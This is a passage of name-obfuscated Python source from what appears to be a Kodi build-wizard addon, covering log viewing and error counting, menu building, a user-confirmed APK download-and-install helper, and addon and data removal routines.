			OOO0000O0O0OO00OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O0O0OO0O0OOO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O00OO0OO000OO0O00 ,'%',COLOR1 ,OOO0O000O0O0OO000 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4211
			if OOO0000O0O0OO00OO :#line:4212
				if isinstance (OOO0O000O0O0OO000 ,unicode ):#line:4213
					OOO0O00O0O00OOO00 =OOO0O00O0O00OOO00 .encode ('utf-8')#line:4214
				wiz .TextBox (ADDONTITLE ,OOO0O00O0O00OOO00 )#line:4215
	DP .close ()#line:4216
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4217
	if INSTALLMETHOD ==1 :O000OO00O0OOO000O =1 #line:4218
	elif INSTALLMETHOD ==2 :O000OO00O0OOO000O =0 #line:4219
	else :O000OO00O0OOO000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4220
	if O000OO00O0OOO000O ==1 :wiz .reloadFix ()#line:4221
	else :wiz .killxbmc (True )#line:4222
def testTheme (OO00OO00OOOO0OO0O ):#line:4224
	OO0000OO0O000000O =zipfile .ZipFile (OO00OO00OOOO0OO0O )#line:4225
	for OO0OOO0O0OO0O0OO0 in OO0000OO0O000000O .infolist ():#line:4226
		if '/settings.xml'in OO0OOO0O0OO0O0OO0 .filename :#line:4227
			return True #line:4228
	return False #line:4229
def testGui (OO0OO00O0OO00000O ):#line:4231
	O0O00000000OO0000 =zipfile .ZipFile (OO0OO00O0OO00000O )#line:4232
	for OOO00OOO0O00OOO00 in O0O00000000OO0000 .infolist ():#line:4233
		if '/guisettings.xml'in OOO00OOO0O00OOO00 .filename :#line:4234
			return True #line:4235
	return False #line:4236
def apkInstaller (O0O0O00000OOOOOO0 ,O0O00O0O0O0OO0000 ):#line:4238
	wiz .log (O0O0O00000OOOOOO0 )#line:4239
	wiz .log (O0O00O0O0O0OO0000 )#line:4240
	if wiz .platform ()=='android':#line:4241
		O0O0OOOO00O0OO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0O00000OOOOOO0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4242
		if not O0O0OOOO00O0OO0OO :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4243
		O0OOO0O0OOOOOO0O0 =O0O0O00000OOOOOO0 #line:4244
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4245
		if not wiz .workingURL (O0O00O0O0O0OO0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4246
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO0O0OOOOOO0O0 ),'','אנא המתן')#line:4247
		OO000O0O0OOOOOO00 =os .path .join (PACKAGES ,"%s.apk"%O0O0O00000OOOOOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4248
		try :os .remove (OO000O0O0OOOOOO00 )#line:4249
		except :pass #line:4250
		downloader .download (O0O00O0O0O0OO0000 ,OO000O0O0OOOOOO00 ,DP )#line:4251
		xbmc .sleep (100 )#line:4252
		DP .close ()#line:4253
		notify .apkInstaller (O0O0O00000OOOOOO0 )#line:4254
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO000O0O0OOOOOO00 +'")')#line:4255
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4256
def createMenu (OO0O00OO0000O0O00 ,O0O0000O000OOO0O0 ,OOOO0OO00OO0O0OO0 ):#line:4262
	if OO0O00OO0000O0O00 =='saveaddon':#line:4263
		OOO0000O000OO0OOO =[]#line:4264
		O0O0O00OOO0000OO0 =urllib .quote_plus (O0O0000O000OOO0O0 .lower ().replace (' ',''))#line:4265
		OOOOOOO000O0O00O0 =O0O0000O000OOO0O0 .replace ('Debrid','Real Debrid')#line:4266
		OO000OOOOOOOO0O00 =urllib .quote_plus (OOOO0OO00OO0O0OO0 .lower ().replace (' ',''))#line:4267
		OOOO0OO00OO0O0OO0 =OOOO0OO00OO0O0OO0 .replace ('url','URL Resolver')#line:4268
		OOO0000O000OO0OOO .append ((THEME2 %OOOO0OO00OO0O0OO0 .title (),' '))#line:4269
		OOO0000O000OO0OOO .append ((THEME3 %'Save %s Data'%OOOOOOO000O0O00O0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O0O00OOO0000OO0 ,OO000OOOOOOOO0O00 )))#line:4270
		OOO0000O000OO0OOO .append ((THEME3 %'Restore %s Data'%OOOOOOO000O0O00O0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O0O00OOO0000OO0 ,OO000OOOOOOOO0O00 )))#line:4271
		OOO0000O000OO0OOO .append ((THEME3 %'Clear %s Data'%OOOOOOO000O0O00O0 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0O0O00OOO0000OO0 ,OO000OOOOOOOO0O00 )))#line:4272
	elif OO0O00OO0000O0O00 =='save':#line:4273
		OOO0000O000OO0OOO =[]#line:4274
		O0O0O00OOO0000OO0 =urllib .quote_plus (O0O0000O000OOO0O0 .lower ().replace (' ',''))#line:4275
		OOOOOOO000O0O00O0 =O0O0000O000OOO0O0 .replace ('Debrid','Real Debrid')#line:4276
		OO000OOOOOOOO0O00 =urllib .quote_plus (OOOO0OO00OO0O0OO0 .lower ().replace (' ',''))#line:4277
		OOOO0OO00OO0O0OO0 =OOOO0OO00OO0O0OO0 .replace ('url','URL Resolver')#line:4278
		OOO0000O000OO0OOO .append ((THEME2 %OOOO0OO00OO0O0OO0 .title (),' '))#line:4279
		OOO0000O000OO0OOO .append ((THEME3 %'Register %s'%OOOOOOO000O0O00O0 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0O0O00OOO0000OO0 ,OO000OOOOOOOO0O00 )))#line:4280
		OOO0000O000OO0OOO .append ((THEME3 %'Save %s Data'%OOOOOOO000O0O00O0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O0O00OOO0000OO0 ,OO000OOOOOOOO0O00 )))#line:4281
		OOO0000O000OO0OOO .append ((THEME3 %'Restore %s Data'%OOOOOOO000O0O00O0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O0O00OOO0000OO0 ,OO000OOOOOOOO0O00 )))#line:4282
		OOO0000O000OO0OOO .append ((THEME3 %'Import %s Data'%OOOOOOO000O0O00O0 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0O0O00OOO0000OO0 ,OO000OOOOOOOO0O00 )))#line:4283
		OOO0000O000OO0OOO .append ((THEME3 %'Clear Addon %s Data'%OOOOOOO000O0O00O0 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0O0O00OOO0000OO0 ,OO000OOOOOOOO0O00 )))#line:4284
	elif OO0O00OO0000O0O00 =='install':#line:4285
		OOO0000O000OO0OOO =[]#line:4286
		OO000OOOOOOOO0O00 =urllib .quote_plus (OOOO0OO00OO0O0OO0 )#line:4287
		OOO0000O000OO0OOO .append ((THEME2 %OOOO0OO00OO0O0OO0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OO000OOOOOOOO0O00 )))#line:4288
		OOO0000O000OO0OOO .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OO000OOOOOOOO0O00 )))#line:4289
		OOO0000O000OO0OOO .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OO000OOOOOOOO0O00 )))#line:4290
		OOO0000O000OO0OOO .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OO000OOOOOOOO0O00 )))#line:4291
		OOO0000O000OO0OOO .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OO000OOOOOOOO0O00 )))#line:4292
	OOO0000O000OO0OOO .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4293
	return OOO0000O000OO0OOO #line:4294
def toggleCache (OO0O00O0OO0O00000 ):#line:4296
	O0O0OOO00OO000OOO =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4297
	O0OOO00O0OOOOO00O =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4298
	if OO0O00O0OO0O00000 in ['true','false']:#line:4299
		for OOO0OOO0O0OO000OO in O0O0OOO00OO000OOO :#line:4300
			wiz .setS (OOO0OOO0O0OO000OO ,OO0O00O0OO0O00000 )#line:4301
	else :#line:4302
		if not OO0O00O0OO0O00000 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4303
			try :#line:4304
				OOO0OOO0O0OO000OO =O0OOO00O0OOOOO00O [O0O0OOO00OO000OOO .index (OO0O00O0OO0O00000 )]#line:4305
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OOO0OOO0O0OO000OO ))#line:4306
			except :#line:4307
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO0O00O0OO0O00000 ))#line:4308
		else :#line:4309
			OOO00OO000O00O0OO ='true'if wiz .getS (OO0O00O0OO0O00000 )=='false'else 'false'#line:4310
			wiz .setS (OO0O00O0OO0O00000 ,OOO00OO000O00O0OO )#line:4311
def playVideo (O0000OO0OO0OOOO0O ):#line:4313
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O0000OO0OO0OOOO0O )#line:4314
	if 'watch?v='in O0000OO0OO0OOOO0O :#line:4315
		OO0OO000O0O0O00O0 ,O0OOO0OO0OO0OO0OO =O0000OO0OO0OOOO0O .split ('?')#line:4316
		O00OO00OO00OOO0O0 =O0OOO0OO0OO0OO0OO .split ('&')#line:4317
		for O00OO00O0O00O0OO0 in O00OO00OO00OOO0O0 :#line:4318
			if O00OO00O0O00O0OO0 .startswith ('v='):#line:4319
				O0000OO0OO0OOOO0O =O00OO00O0O00O0OO0 [2 :]#line:4320
				break #line:4321
			else :continue #line:4322
	elif 'embed'in O0000OO0OO0OOOO0O or 'youtu.be'in O0000OO0OO0OOOO0O :#line:4323
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O0000OO0OO0OOOO0O )#line:4324
		OO0OO000O0O0O00O0 =O0000OO0OO0OOOO0O .split ('/')#line:4325
		if len (OO0OO000O0O0O00O0 [-1 ])>5 :#line:4326
			O0000OO0OO0OOOO0O =OO0OO000O0O0O00O0 [-1 ]#line:4327
		elif len (OO0OO000O0O0O00O0 [-2 ])>5 :#line:4328
			O0000OO0OO0OOOO0O =OO0OO000O0O0O00O0 [-2 ]#line:4329
	wiz .log ("YouTube URL: %s"%O0000OO0OO0OOOO0O )#line:4330
	yt .PlayVideo (O0000OO0OO0OOOO0O )#line:4331
def viewLogFile ():#line:4333
	O0O000O0O00OO0O00 =wiz .Grab_Log (True )#line:4334
	OO0O0OO0O0O000OO0 =wiz .Grab_Log (True ,True )#line:4335
	O00OOO0OOOO0OO000 =0 ;OO000O0OO00O0OOOO =O0O000O0O00OO0O00 #line:4336
	if not OO0O0OO0O0O000OO0 ==False and not O0O000O0O00OO0O00 ==False :#line:4337
		O00OOO0OOOO0OO000 =DIALOG .select (ADDONTITLE ,["View %s"%O0O000O0O00OO0O00 .replace (LOG ,""),"View %s"%OO0O0OO0O0O000OO0 .replace (LOG ,"")])#line:4338
		if O00OOO0OOOO0OO000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4339
	elif O0O000O0O00OO0O00 ==False and OO0O0OO0O0O000OO0 ==False :#line:4340
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4341
		return #line:4342
	elif not O0O000O0O00OO0O00 ==False :O00OOO0OOOO0OO000 =0 #line:4343
	elif not OO0O0OO0O0O000OO0 ==False :O00OOO0OOOO0OO000 =1 #line:4344
	OO000O0OO00O0OOOO =O0O000O0O00OO0O00 if O00OOO0OOOO0OO000 ==0 else OO0O0OO0O0O000OO0 #line:4346
	OO00OO00000OOOOO0 =wiz .Grab_Log (False )if O00OOO0OOOO0OO000 ==0 else wiz .Grab_Log (False ,True )#line:4347
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO000O0OO00O0OOOO ),OO00OO00000OOOOO0 )#line:4349
def errorChecking (log =None ,count =None ,all =None ):#line:4351
	if log ==None :#line:4352
		O0O0OOO0000O0OO00 =wiz .Grab_Log (True )#line:4353
		OO0O000OOO0OO0OO0 =wiz .Grab_Log (True ,True )#line:4354
		if not OO0O000OOO0OO0OO0 ==False and not O0O0OOO0000O0OO00 ==False :#line:4355
			O00OO0000O000OO00 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0O0OOO0000O0OO00 .replace (LOG ,""),errorChecking (O0O0OOO0000O0OO00 ,True ,True )),"View %s: %s error(s)"%(OO0O000OOO0OO0OO0 .replace (LOG ,""),errorChecking (OO0O000OOO0OO0OO0 ,True ,True ))])#line:4356
			if O00OO0000O000OO00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4357
		elif O0O0OOO0000O0OO00 ==False and OO0O000OOO0OO0OO0 ==False :#line:4358
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4359
			return #line:4360
		elif not O0O0OOO0000O0OO00 ==False :O00OO0000O000OO00 =0 #line:4361
		elif not OO0O000OOO0OO0OO0 ==False :O00OO0000O000OO00 =1 #line:4362
		log =O0O0OOO0000O0OO00 if O00OO0000O000OO00 ==0 else OO0O000OOO0OO0OO0 #line:4363
	if log ==False :#line:4364
		if count ==None :#line:4365
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4366
			return False #line:4367
		else :#line:4368
			return 0 #line:4369
	else :#line:4370
		if os .path .exists (log ):#line:4371
			O0OOO000O00000OO0 =open (log ,mode ='r');OO0OO00OO00O0O00O =O0OOO000O00000OO0 .read ().replace ('\n','').replace ('\r','');O0OOO000O00000OO0 .close ()#line:4372
			OO0OO00OO00000O00 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OO0OO00OO00O0O00O )#line:4373
			if not count ==None :#line:4374
				if all ==None :#line:4375
					OO0O0O0000OO0000O =0 #line:4376
					for O0O0OO0OO0000OOOO in OO0OO00OO00000O00 :#line:4377
						if ADDON_ID in O0O0OO0OO0000OOOO :OO0O0O0000OO0000O +=1 #line:4378
					return OO0O0O0000OO0000O #line:4379
				else :return len (OO0OO00OO00000O00 )#line:4380
			if len (OO0OO00OO00000O00 )>0 :#line:4381
				OO0O0O0000OO0000O =0 ;O00OO0OO00O00O0O0 =""#line:4382
				for O0O0OO0OO0000OOOO in OO0OO00OO00000O00 :#line:4383
					if all ==None and not ADDON_ID in O0O0OO0OO0000OOOO :continue #line:4384
					else :#line:4385
						OO0O0O0000OO0000O +=1 #line:4386
						O00OO0OO00O00O0O0 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OO0O0O0000OO0000O ,O0O0OO0OO0000OOOO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4387
				if OO0O0O0000OO0000O >0 :#line:4388
					wiz .TextBox (ADDONTITLE ,O00OO0OO00O00O0O0 )#line:4389
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4390
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4391
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4392
ACTION_PREVIOUS_MENU =10 #line:4394
ACTION_NAV_BACK =92 #line:4395
ACTION_MOVE_LEFT =1 #line:4396
ACTION_MOVE_RIGHT =2 #line:4397
ACTION_MOVE_UP =3 #line:4398
ACTION_MOVE_DOWN =4 #line:4399
ACTION_MOUSE_WHEEL_UP =104 #line:4400
ACTION_MOUSE_WHEEL_DOWN =105 #line:4401
ACTION_MOVE_MOUSE =107 #line:4402
ACTION_SELECT_ITEM =7 #line:4403
ACTION_BACKSPACE =110 #line:4404
ACTION_MOUSE_LEFT_CLICK =100 #line:4405
ACTION_MOUSE_LONG_CLICK =108 #line:4406
def LogViewer (default =None ):#line:4408
	class OO00O0000O00O000O (xbmcgui .WindowXMLDialog ):#line:4409
		def __init__ (O0O000OOO0O0000OO ,*O00000O0O00OO00O0 ,**OOO0OOO0O0OOOOO0O ):#line:4410
			O0O000OOO0O0000OO .default =OOO0OOO0O0OOOOO0O ['default']#line:4411
		def onInit (O0O000000OO0OOOO0 ):#line:4413
			O0O000000OO0OOOO0 .title =101 #line:4414
			O0O000000OO0OOOO0 .msg =102 #line:4415
			O0O000000OO0OOOO0 .scrollbar =103 #line:4416
			O0O000000OO0OOOO0 .upload =201 #line:4417
			O0O000000OO0OOOO0 .kodi =202 #line:4418
			O0O000000OO0OOOO0 .kodiold =203 #line:4419
			O0O000000OO0OOOO0 .wizard =204 #line:4420
			O0O000000OO0OOOO0 .okbutton =205 #line:4421
			O0OO0000OO0OO00OO =open (O0O000000OO0OOOO0 .default ,'r')#line:4422
			O0O000000OO0OOOO0 .logmsg =O0OO0000OO0OO00OO .read ()#line:4423
			O0OO0000OO0OO00OO .close ()#line:4424
			O0O000000OO0OOOO0 .titlemsg ="%s: %s"%(ADDONTITLE ,O0O000000OO0OOOO0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4425
			O0O000000OO0OOOO0 .showdialog ()#line:4426
		def showdialog (OO0O00000OOOO00OO ):#line:4428
			OO0O00000OOOO00OO .getControl (OO0O00000OOOO00OO .title ).setLabel (OO0O00000OOOO00OO .titlemsg )#line:4429
			OO0O00000OOOO00OO .getControl (OO0O00000OOOO00OO .msg ).setText (wiz .highlightText (OO0O00000OOOO00OO .logmsg ))#line:4430
			OO0O00000OOOO00OO .setFocusId (OO0O00000OOOO00OO .scrollbar )#line:4431
		def onClick (O0OO00OO0000OOOOO ,O00O00OO000O0OOO0 ):#line:4433
			if O00O00OO000O0OOO0 ==O0OO00OO0000OOOOO .okbutton :O0OO00OO0000OOOOO .close ()#line:4434
			elif O00O00OO000O0OOO0 ==O0OO00OO0000OOOOO .upload :O0OO00OO0000OOOOO .close ();uploadLog .Main ()#line:4435
			elif O00O00OO000O0OOO0 ==O0OO00OO0000OOOOO .kodi :#line:4436
				O0O0O0O00OOO0O0OO =wiz .Grab_Log (False )#line:4437
				OOOO0000O00OOO00O =wiz .Grab_Log (True )#line:4438
				if O0O0O0O00OOO0O0OO ==False :#line:4439
					O0OO00OO0000OOOOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4440
					O0OO00OO0000OOOOO .getControl (O0OO00OO0000OOOOO .msg ).setText ("Log File Does Not Exists!")#line:4441
				else :#line:4442
					O0OO00OO0000OOOOO .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0000O00OOO00O .replace (LOG ,''))#line:4443
					O0OO00OO0000OOOOO .getControl (O0OO00OO0000OOOOO .title ).setLabel (O0OO00OO0000OOOOO .titlemsg )#line:4444
					O0OO00OO0000OOOOO .getControl (O0OO00OO0000OOOOO .msg ).setText (wiz .highlightText (O0O0O0O00OOO0O0OO ))#line:4445
					O0OO00OO0000OOOOO .setFocusId (O0OO00OO0000OOOOO .scrollbar )#line:4446
			elif O00O00OO000O0OOO0 ==O0OO00OO0000OOOOO .kodiold :#line:4447
				O0O0O0O00OOO0O0OO =wiz .Grab_Log (False ,True )#line:4448
				OOOO0000O00OOO00O =wiz .Grab_Log (True ,True )#line:4449
				if O0O0O0O00OOO0O0OO ==False :#line:4450
					O0OO00OO0000OOOOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4451
					O0OO00OO0000OOOOO .getControl (O0OO00OO0000OOOOO .msg ).setText ("Log File Does Not Exists!")#line:4452
				else :#line:4453
					O0OO00OO0000OOOOO .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0000O00OOO00O .replace (LOG ,''))#line:4454
					O0OO00OO0000OOOOO .getControl (O0OO00OO0000OOOOO .title ).setLabel (O0OO00OO0000OOOOO .titlemsg )#line:4455
					O0OO00OO0000OOOOO .getControl (O0OO00OO0000OOOOO .msg ).setText (wiz .highlightText (O0O0O0O00OOO0O0OO ))#line:4456
					O0OO00OO0000OOOOO .setFocusId (O0OO00OO0000OOOOO .scrollbar )#line:4457
			elif O00O00OO000O0OOO0 ==O0OO00OO0000OOOOO .wizard :#line:4458
				O0O0O0O00OOO0O0OO =wiz .Grab_Log (False ,False ,True )#line:4459
				OOOO0000O00OOO00O =wiz .Grab_Log (True ,False ,True )#line:4460
				if O0O0O0O00OOO0O0OO ==False :#line:4461
					O0OO00OO0000OOOOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4462
					O0OO00OO0000OOOOO .getControl (O0OO00OO0000OOOOO .msg ).setText ("Log File Does Not Exists!")#line:4463
				else :#line:4464
					O0OO00OO0000OOOOO .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0000O00OOO00O .replace (ADDONDATA ,''))#line:4465
					O0OO00OO0000OOOOO .getControl (O0OO00OO0000OOOOO .title ).setLabel (O0OO00OO0000OOOOO .titlemsg )#line:4466
					O0OO00OO0000OOOOO .getControl (O0OO00OO0000OOOOO .msg ).setText (wiz .highlightText (O0O0O0O00OOO0O0OO ))#line:4467
					O0OO00OO0000OOOOO .setFocusId (O0OO00OO0000OOOOO .scrollbar )#line:4468
		def onAction (OOO00OO00O0OOOOOO ,OO000OOO0000O0O0O ):#line:4470
			if OO000OOO0000O0O0O ==ACTION_PREVIOUS_MENU :OOO00OO00O0OOOOOO .close ()#line:4471
			elif OO000OOO0000O0O0O ==ACTION_NAV_BACK :OOO00OO00O0OOOOOO .close ()#line:4472
	if default ==None :default =wiz .Grab_Log (True )#line:4473
	O00O0O00OO00000OO =OO00O0000O00O000O ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4474
	O00O0O00OO00000OO .doModal ()#line:4475
	del O00O0O00OO00000OO #line:4476
def removeAddon (O00O000OOOO0OOO0O ,OO0000OOOOO0OOO0O ,over =False ):#line:4478
	if not over ==False :#line:4479
		O0O0OOOOOO0O00O00 =1 #line:4480
	else :#line:4481
		O0O0OOOOOO0O00O00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0000OOOOO0OOO0O ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O00O000OOOO0OOO0O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4482
	if O0O0OOOOOO0O00O00 ==1 :#line:4483
		OO000O0O0O0OO00O0 =os .path .join (ADDONS ,O00O000OOOO0OOO0O )#line:4484
		wiz .log ("Removing Addon %s"%O00O000OOOO0OOO0O )#line:4485
		wiz .cleanHouse (OO000O0O0O0OO00O0 )#line:4486
		xbmc .sleep (1000 )#line:4487
		try :shutil .rmtree (OO000O0O0O0OO00O0 )#line:4488
		except Exception as O0O00O0000OO00O00 :wiz .log ("Error removing %s"%O00O000OOOO0OOO0O ,xbmc .LOGNOTICE )#line:4489
		removeAddonData (O00O000OOOO0OOO0O ,OO0000OOOOO0OOO0O ,over )#line:4490
	if over ==False :#line:4491
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OO0000OOOOO0OOO0O ))#line:4492
def removeAddonData (O0OO00OOOOO0O0O00 ,name =None ,over =False ):#line:4494
	if O0OO00OOOOO0O0O00 =='all':#line:4495
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4496
			wiz .cleanHouse (ADDOND )#line:4497
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4498
	elif O0OO00OOOOO0O0O00 =='uninstalled':#line:4499
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4500
			OOOO000OO0O0OO00O =0 #line:4501
			for OO00O000OO00OOOO0 in glob .glob (os .path .join (ADDOND ,'*')):#line:4502
				OOO00OO000O0000O0 =OO00O000OO00OOOO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4503
				if OOO00OO000O0000O0 in EXCLUDES :pass #line:4504
				elif os .path .exists (os .path .join (ADDONS ,OOO00OO000O0000O0 )):pass #line:4505
				else :wiz .cleanHouse (OO00O000OO00OOOO0 );OOOO000OO0O0OO00O +=1 ;wiz .log (OO00O000OO00OOOO0 );shutil .rmtree (OO00O000OO00OOOO0 )#line:4506
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOO000OO0O0OO00O ))#line:4507
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4508
	elif O0OO00OOOOO0O0O00 =='empty':#line:4509
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4510
			OOOO000OO0O0OO00O =wiz .emptyfolder (ADDOND )#line:4511
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOO000OO0O0OO00O ))#line:4512
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4513
	else :#line:4514
		OO0O0OOOO000O0000 =os .path .join (USERDATA ,'addon_data',O0OO00OOOOO0O0O00 )#line:4515
		if O0OO00OOOOO0O0O00 in EXCLUDES :#line:4516
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4517
		elif os .path .exists (OO0O0OOOO000O0000 ):#line:4518
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO00OOOOO0O0O00 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4519
